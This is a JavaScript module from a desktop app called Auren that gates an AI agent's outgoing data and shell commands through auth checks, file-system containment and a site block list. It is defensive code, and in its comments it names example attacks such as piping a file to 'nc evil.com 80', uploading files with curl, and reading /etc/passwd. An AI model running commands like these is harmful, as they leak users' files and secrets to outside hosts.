/* Auren - agentgate.js
 *
 * Shared decision functions for Auren's agent gates. There is exactly ONE
 * implementation of each decision, and every integration surface calls it:
 * the Electron IPC handlers (src/main.js) and the loopback HTTP bridge
 * (src/bridge/http.js). Keeping the logic here means a decision made over the
 * bridge is identical to one made over IPC, and both are unit-testable without
 * Electron.
 *
 * This module is pure: it only needs the pieces passed in via ctx.
 *
 * ctx contract:
 *   {
 *     mode: 'on' | 'off',
 *     degraded: boolean,        // enforcement can't be trusted -> fail closed
 *     failClosed: boolean,      // encrypted store unverified -> fail closed
 *     sensitiveRules: object,   // settings.sensitivePolicy (may be undefined)
 *     commandRules: object,     // settings.commandPolicy (may be undefined)
 *     blocklist: string[],      // site block list (for isBlocked)
 *     authFn: (reason) => Promise<boolean>,  // OS-native auth checkpoint
 *     logFn: (entry) => void,   // writes an activity entry
 *     notifyFn: (void) => void  // optional UI push after a decision
 *   }
 */

'use strict';

const sensitive = require('./sensitive');
const commands = require('./commands');
const policy = require('./policy');
const activity = require('./activity');
const fsguard = require('./fsguard');
const { normalizeDomain, domainMatches } = require('./domains');

// Split a shell line the same way the command classifier does so a pipeline
// like `cat <ws>/a | nc evil.com 80` yields per-segment file candidates.
const SEGMENT_RE = /(?:\|\||&&|\||;)/;

// Tokens that are shell plumbing, never file paths.
const REDIR_RE = /^[0-9]*[<>]+.*$/;
const URL_RE = /^[a-z][a-z0-9+.-]*:\/\/+/i;

/**
 * Extract candidate local file paths from a shell command line.
 * Conservative: only tokens containing `/` or `\` or starting with `~`
 * are considered (absolute paths, ~/..., ./..., ../..., a/b). Bare
 * hostnames (`evil.com`), ports (`80`), flags (`-la`) and URLs are skipped
 * so network gates keep their own verdicts. `key=value` / `file=@path`
 * wrappers (curl -F) are unwrapped to the path after `=` / `@`.
 * The argv[0] command name of each segment is never treated as a path.
 *
 * @param {string|string[]} input
 * @returns {string[]}
 */
function extractFsPaths(input) {
  const raw = Array.isArray(input) ? input.join(' ') : String(input || '');
  if (!raw.trim()) return [];
  const out = [];
  for (const segment of raw.split(SEGMENT_RE)) {
    const argv = commands.tokenizeSegment(segment);
    if (argv.length === 0) continue;
    // Skip the command itself (argv[0] after wrappers still resolves via
    // baseCommand, but argv[1..] are the only possible file operands).
    const args = argv.slice(1);
    for (let tok of args) {
      if (!tok) continue;
      if (tok === '<' || tok === '>' || tok === '>>' || tok === '<<') continue;
      if (REDIR_RE.test(tok)) continue;
      if (tok.startsWith('-')) continue;
      // Unwrap VAR=path and file=@path forms (curl -F "file=@~/x").
      const eq = tok.lastIndexOf('=');
      if (eq !== -1 && eq < tok.length - 1) tok = tok.slice(eq + 1);
      const at = tok.lastIndexOf('@');
      if (at !== -1 && at < tok.length - 1 && /[/\\~]/.test(tok.slice(at + 1))) tok = tok.slice(at + 1);
      // Remote targets are not local files: user@host:/remote, user@host.
      if (tok.includes('@')) continue;
      if (URL_RE.test(tok)) continue;
      // Strip trailing shell punctuation (e.g. `scp a b:`).
      tok = tok.replace(/[,:;]+$/, '');
      if (!tok) continue;
      if (!(tok.includes('/') || tok.includes('\\') || tok.startsWith('~'))) continue;
      // Skip host:port shapes (10.0.0.1:443) — network, not files.
      if (/^[^/\\:@\s]+:[0-9]+$/.test(tok)) continue;
      out.push(tok);
    }
  }
  return [...new Set(out)];
}

// The allow/log/block/require_auth tail shared by both gates. Returns the same
// shape as the old IPC handlers: { allowed, action, types, reason } where
// `action` is the policy action, not the actual outcome (so a require_auth
// decision that the user cancels returns action 'require_auth' but allowed
// false, exactly as before).
async function runDecision(signal, decision, opts) {
  const { kind, reason, ctx } = opts;
  let allowed = false;
  let outcome;
  if (decision.action === 'allow') {
    allowed = true;
    outcome = 'allowed';
  } else if (decision.action === 'log') {
    allowed = true;
    outcome = 'logged';
  } else if (decision.action === 'block') {
    outcome = 'blocked';
  } else {
    // require_auth — the user's OS-native checkpoint decides.
    const ok = await ctx.authFn(reason);
    if (ok) { allowed = true; outcome = 'allowed'; }
    else outcome = 'blocked';
  }

  const note = 'types=' + (signal.types.join(',') || 'none');
  if (ctx.logFn) ctx.logFn(activity.makeEntry(kind, outcome, null, note));
  if (ctx.notifyFn) ctx.notifyFn();
  return { allowed, action: decision.action, types: signal.types, reason: decision.reason };
}

// Gate an outgoing agent action (form submission, JSON body, raw payload).
// Unlike the command gate there is NO mode guard: a sensitive payload asks for
// native auth even while protection is off. While degraded it fails closed.
async function inspectAction(payload, ctx = {}) {
  const signal = sensitive.classifySensitivePayload(payload);
  const decision = policy.decidePolicy(signal, {
    degraded: ctx.degraded || ctx.failClosed,
    rules: ctx.sensitiveRules
  });
  const typesLabel = signal.types.join(', ') || 'sensitive data';
  const reason = 'Approve sending ' + typesLabel + (payload && payload.url ? ' to ' + payload.url : '');
  return runDecision(signal, decision, { kind: 'agent', reason, ctx });
}

// Gate an OS/terminal-level agent command. Tied to Protection Mode: while
// protection is OFF the gate does not stand in the way; while degraded it
// refuses (fail-closed). Only a bridge/native host that routes commands
// through Auren hits this gate — the pf firewall covers everything else.
//
// File System Guard enforcement: while protection is ON and a fsGuard policy
// is present in ctx, any local file operand outside the allowed mounts (or
// matching a forced exclusion) denies the whole command — even when the
// command itself is network-benign (`open /etc/passwd`, `cat /tmp/other`).
// Commands without file operands (e.g. `ls -la`) are unaffected.
async function inspectCommand(cmd, ctx = {}) {
  if (ctx.degraded || ctx.failClosed) {
    if (ctx.logFn) ctx.logFn(activity.makeEntry('command', 'blocked', null, 'enforcement degraded'));
    if (ctx.notifyFn) ctx.notifyFn();
    return { allowed: false, action: 'block', types: [], reason: 'enforcement degraded' };
  }
  if (ctx.mode !== 'on') {
    return { allowed: true, action: 'allow', types: [], reason: 'protection off' };
  }
  const signal = commands.classifyCommand(cmd);
  // FS containment applies on top of the network classification.
  if (ctx.fsGuard) {
    const candidates = extractFsPaths(cmd);
    for (const p of candidates) {
      let res;
      try {
        res = fsguard.isAccessAllowed(p, ctx.fsGuard);
      } catch {
        res = { allowed: false, canonical: null, reason: 'file guard error — default deny' };
      }
      if (!res.allowed) {
        const types = [...new Set([...signal.types, 'fs_denied'])];
        const label = res.canonical || p;
        const reason = 'file access outside allowed mounts: ' + label + ' — ' + res.reason;
        if (ctx.logFn) ctx.logFn(activity.makeEntry('command', 'blocked', null, 'fs blocked: ' + reason.slice(0, 200)));
        if (ctx.notifyFn) ctx.notifyFn();
        const out = { allowed: false, action: 'block', types, reason };
        if (res.rule) out.rule = res.rule;
        if (res.canonical) out.canonical = res.canonical;
        return out;
      }
    }
  }
  const decision = policy.decidePolicy(signal, { degraded: false, rules: ctx.commandRules });
  const typesLabel = signal.types.join(', ') || 'network access';
  const reason = 'Approve running a network-capable command (' + typesLabel + ')';
  return runDecision(signal, decision, { kind: 'command', reason, ctx });
}

// Read-only "is this site blocked?" used by the UI and any bridge component.
// While degraded everything is reported as blocked (fail-closed).
function isBlocked(domain, ctx = {}) {
  if (ctx.degraded || ctx.failClosed) return true;
  if (ctx.mode !== 'on') return false;
  const d = normalizeDomain(domain);
  return (ctx.blocklist || []).some((x) => domainMatches(d, x));
}

module.exports = { inspectAction, inspectCommand, isBlocked, extractFsPaths };
